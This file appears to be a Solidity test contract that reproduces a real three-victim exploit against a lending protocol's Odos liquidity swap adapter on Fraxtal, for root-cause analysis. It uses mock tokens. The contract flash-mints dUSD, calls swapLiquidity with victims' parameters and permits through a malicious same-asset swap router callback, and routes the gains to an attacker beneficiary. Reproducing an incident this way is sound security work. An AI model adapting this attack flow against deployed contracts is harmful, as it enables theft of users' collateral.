// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "contracts/lending/core/dependencies/openzeppelin/contracts/IERC20.sol";
import {SafeERC20} from "contracts/lending/core/dependencies/openzeppelin/contracts/SafeERC20.sol";
import {Ownable} from "contracts/lending/core/dependencies/openzeppelin/contracts/Ownable.sol";
import {IOdosLiquiditySwapAdapter} from "contracts/lending/periphery/adapters/odos/interfaces/IOdosLiquiditySwapAdapter.sol";
import {IWithdrawHook} from "../lending/IWithdrawHook.sol";
import {DusdHelperMock} from "./DusdHelperMock.sol";
import {TestMintableERC20} from "../token/TestMintableERC20.sol";

/**
 * @title ThreeVictimAttackExecutor
 * @notice Attack executor for three-victim exploit scenario on Fraxtal
 * @dev Simulates the real exploit against three different collateral types (dUSD, sfrxETH, sUSDe)
 * Flash-mints 40,000 dUSD (6 decimals) to execute three sequential swapLiquidity calls
 */
contract ThreeVictimAttackExecutor is Ownable, IWithdrawHook {
    using SafeERC20 for IERC20;

    struct CollateralToken {
        TestMintableERC20 token;
        IERC20 erc20;
        uint256 dustAmount;  // 1 micro-unit respecting token decimals
    }

    struct StageAddresses {
        address stagingVault;
        address recycler;
        address splitter;
        address microDistributorOne;
        address microDistributorTwo;
    }

    // Three different collateral tokens
    CollateralToken[3] public collateralTokens;

    TestMintableERC20 public immutable dusdToken;
    IERC20 private immutable dusdErc20;
    address public immutable router;
    IOdosLiquiditySwapAdapter public immutable adapter;
    address public immutable attackerBeneficiary;

    address public pool;

    DusdHelperMock public stagingVault;
    DusdHelperMock public recycler;
    DusdHelperMock public splitter;
    address public microDistributorOne;
    address public microDistributorTwo;

    uint256 public flashLoanAmount;
    uint256 public flashLoanPremium;
    bool public flashMintActive;
    uint8 public currentVictimIndex;

    // Fraxtal-specific: dUSD uses 6 decimals, flash-mint 40,000 dUSD
    uint256 private constant FLASH_MINT_AMOUNT = 40_000 * 1e6; // 6 decimals

    // dUSD flow amounts (adjusted for 6 decimals)
    uint256 private constant DUSD_STAGE_ONE = 21_444_122_422;      // ~21,444 dUSD
    uint256 private constant DUSD_STAGE_TWO = 7_133_477_578;       // ~7,133 dUSD
    uint256 private constant DUSD_RECYCLER_PULL_ONE = 26_681_458_777; // ~26,681 dUSD
    uint256 private constant DUSD_RECYCLER_PULL_TWO = 8_998_899_406;  // ~8,998 dUSD
    uint256 private constant DUSD_RECYCLER_RETURN = 7_052_758_184;    // ~7,052 dUSD
    uint256 private constant DUSD_SPLITTER_ROUND = 25 * 1e6;          // 25 dUSD
    uint256 private constant MICRO_DISTRIBUTOR_ONE = 10_000_000;      // 0.01 dUSD
    uint256 private constant MICRO_DISTRIBUTOR_TWO = 240_000_000;     // 0.24 dUSD

    // Attacker gains per victim (to be set based on actual test values)
    uint256[3] public burstAmounts;

    uint256 private constant FLASH_LOAN_PREMIUM_BPS = 5;

    error InvalidPool(address provided);
    error UnauthorizedPool(address sender, address expected);
    error UnexpectedCollateral(address actual, address expected);
    error InvalidVictimCount(uint256 provided, uint256 expected);

    // Events matching production trace for Tenderly comparison
    event FlashMintStarted(address indexed executor, uint256 amount);
    event FlashMintSettled(address indexed executor, uint256 repayAmount, uint256 premium);
    event AttackerBurst(address indexed executor, address indexed recipient, uint256 amount, uint8 victimIndex);

    // Helper events for RCA analysis
    event DusdShuttled(address indexed helper, uint256 amount);
    event DusdFanOut(address indexed splitter, address indexed recipient, uint256 amount);
    event CollateralDustReturned(address indexed adapterAddress, address indexed token, uint256 amount);
    event FlashLoanRecorded(uint256 amount);
    event FlashLoanRepayment(address indexed adapterAddress, uint256 amount);
    event VictimProcessed(uint8 victimIndex, address collateralToken, uint256 amountPulled);

    constructor(
        TestMintableERC20[3] memory collateralTokens_,
        TestMintableERC20 dusd_,
        address router_,
        IOdosLiquiditySwapAdapter adapter_,
        address attackerBeneficiary_
    ) Ownable() {
        for (uint8 i = 0; i < 3; i++) {
            collateralTokens[i].token = collateralTokens_[i];
            collateralTokens[i].erc20 = IERC20(address(collateralTokens_[i]));
            // Set dust based on decimals: 1 for 6-decimal tokens, 1 for 18-decimal tokens
            collateralTokens[i].dustAmount = 1;

            // Approve router to skim dust from each collateral token
            collateralTokens[i].erc20.safeApprove(router_, type(uint256).max);
        }

        dusdToken = dusd_;
        dusdErc20 = IERC20(address(dusd_));
        router = router_;
        adapter = adapter_;
        attackerBeneficiary = attackerBeneficiary_;
    }

    function setPool(address pool_) external onlyOwner {
        if (pool_ == address(0)) {
            revert InvalidPool(pool_);
        }
        pool = pool_;
    }

    function configureDusdHelpers(StageAddresses calldata addresses) external onlyOwner {
        if (addresses.stagingVault != address(0)) {
            stagingVault = DusdHelperMock(addresses.stagingVault);
            stagingVault.setController(address(this));
        }

        if (addresses.recycler != address(0)) {
            recycler = DusdHelperMock(addresses.recycler);
            recycler.setController(address(this));
        }

        if (addresses.splitter != address(0)) {
            splitter = DusdHelperMock(addresses.splitter);
            splitter.setController(address(this));
        }

        microDistributorOne = addresses.microDistributorOne;
        microDistributorTwo = addresses.microDistributorTwo;
    }

    function setBurstAmounts(uint256[3] calldata amounts) external onlyOwner {
        burstAmounts = amounts;
    }

    /**
     * @notice Execute three-victim attack
     * @param params Array of 3 LiquiditySwapParams, one for each victim
     * @param permitInputs Array of 3 PermitInput, one for each victim
     */
    function executeThreeVictimAttack(
        IOdosLiquiditySwapAdapter.LiquiditySwapParams[3] calldata params,
        IOdosLiquiditySwapAdapter.PermitInput[3] calldata permitInputs
    ) external onlyOwner {
        flashLoanAmount = 0;
        flashLoanPremium = 0;

        // Start flash mint for the entire attack
        _startFlashMint();

        // Execute three sequential swapLiquidity calls
        for (uint8 i = 0; i < 3; i++) {
            currentVictimIndex = i;

            // Calculate flash loan for this victim if needed
            if (params[i].withFlashLoan) {
                flashLoanAmount = params[i].collateralAmountToSwap;
                flashLoanPremium = _computePremium(flashLoanAmount);
                flashLoanAmount = flashLoanAmount + flashLoanPremium;
            }

            adapter.swapLiquidity(params[i], permitInputs[i]);

            emit VictimProcessed(i, params[i].collateralAsset, params[i].collateralAmountToSwap);
        }

        // Harvest all gains
        _simulateCollateralHarvest();

        // Finalize flash mint
        _finalizeFlashMint();
    }

    function onMaliciousSwap(
        address inputToken,
        address outputToken,
        uint256 amountPulled
    ) external {
        if (msg.sender != router) {
            revert("UNAUTHORIZED_ROUTER");
        }

        // For same-asset swap (exploit path), input and output are the same
        bool isSameAssetSwap = inputToken == outputToken;
        uint256 burnAmount = 0;
        bool emitDustEvent;

        if (isSameAssetSwap) {
            // Verify it's one of our expected collateral tokens
            bool isValidToken = false;
            uint8 tokenIndex = 0;
            for (uint8 i = 0; i < 3; i++) {
                if (inputToken == address(collateralTokens[i].token)) {
                    isValidToken = true;
                    tokenIndex = i;
                    break;
                }
            }

            if (!isValidToken) {
                revert UnexpectedCollateral(inputToken, address(0));
            }

            uint256 dustAmount = collateralTokens[tokenIndex].dustAmount;
            if (dustAmount > 0 && amountPulled >= dustAmount) {
                burnAmount = 0;
                emitDustEvent = true;
            }
        } else {
            revert("UNEXPECTED_CROSS_ASSET_SWAP");
        }

        emit FlashLoanRecorded(amountPulled);

        if (emitDustEvent) {
            emit CollateralDustReturned(address(adapter), inputToken, collateralTokens[currentVictimIndex].dustAmount);
        }

        if (flashMintActive && burnAmount > 0) {
            collateralTokens[currentVictimIndex].token.burn(burnAmount);
        }
    }

    function _startFlashMint() internal {
        flashMintActive = true;
        dusdToken.mint(address(this), FLASH_MINT_AMOUNT);
        emit FlashMintStarted(address(this), FLASH_MINT_AMOUNT);

        _maybeTransferDusd(address(stagingVault), DUSD_STAGE_ONE);
        _pullFromRecycler(DUSD_RECYCLER_PULL_ONE);
        _fanOutSplitter();

        _maybeTransferDusd(address(stagingVault), DUSD_STAGE_TWO);
        _pullFromRecycler(DUSD_RECYCLER_PULL_TWO);
        _fanOutSplitter();
        _maybeTransferDusd(address(recycler), DUSD_RECYCLER_RETURN);
    }

    function _finalizeFlashMint() internal {
        dusdToken.burn(FLASH_MINT_AMOUNT);
        emit FlashMintSettled(address(this), FLASH_MINT_AMOUNT, 0);
        flashMintActive = false;
        flashLoanAmount = 0;
        flashLoanPremium = 0;
    }

    function _simulateCollateralHarvest() internal {
        // Transfer gains from all three victims to attacker beneficiary
        for (uint8 i = 0; i < 3; i++) {
            if (burstAmounts[i] > 0) {
                // Transfer gains
                collateralTokens[i].erc20.safeTransfer(attackerBeneficiary, burstAmounts[i]);
                emit AttackerBurst(address(this), attackerBeneficiary, burstAmounts[i], i);
            }
        }
    }

    function onWithdraw(
        address asset,
        address caller,
        address originalRecipient,
        uint256 amount
    ) external override {
        caller;
        originalRecipient;
        amount;

        if (msg.sender != pool) {
            revert UnauthorizedPool(msg.sender, pool);
        }

        // Verify it's one of our expected collateral tokens
        bool isValidToken = false;
        uint8 tokenIndex = 0;
        for (uint8 i = 0; i < 3; i++) {
            if (asset == address(collateralTokens[i].token)) {
                isValidToken = true;
                tokenIndex = i;
                break;
            }
        }

        if (!isValidToken) {
            revert UnexpectedCollateral(asset, address(0));
        }

    }

    function _maybeTransferDusd(address target, uint256 amount) internal {
        if (target == address(0) || amount == 0) {
            return;
        }
        dusdErc20.safeTransfer(target, amount);
        emit DusdShuttled(target, amount);
    }

    function _pullFromRecycler(uint256 amount) internal {
        if (address(recycler) == address(0) || amount == 0) {
            return;
        }
        recycler.forward(address(this), amount);
        emit DusdShuttled(address(recycler), amount);
    }

    function _fanOutSplitter() internal {
        if (address(splitter) == address(0) || (microDistributorOne == address(0) && microDistributorTwo == address(0))) {
            return;
        }

        dusdErc20.safeTransfer(address(splitter), DUSD_SPLITTER_ROUND);

        address[] memory recipients = new address[](2);
        uint256[] memory amounts = new uint256[](2);
        recipients[0] = microDistributorOne;
        recipients[1] = microDistributorTwo;
        amounts[0] = MICRO_DISTRIBUTOR_ONE;
        amounts[1] = MICRO_DISTRIBUTOR_TWO;
        splitter.fanOut(recipients, amounts);

        emit DusdFanOut(address(splitter), microDistributorOne, MICRO_DISTRIBUTOR_ONE);
        emit DusdFanOut(address(splitter), microDistributorTwo, MICRO_DISTRIBUTOR_TWO);
    }

    function _computePremium(uint256 amountPulled) private pure returns (uint256) {
        return (amountPulled * FLASH_LOAN_PREMIUM_BPS) / 10_000;
    }
}
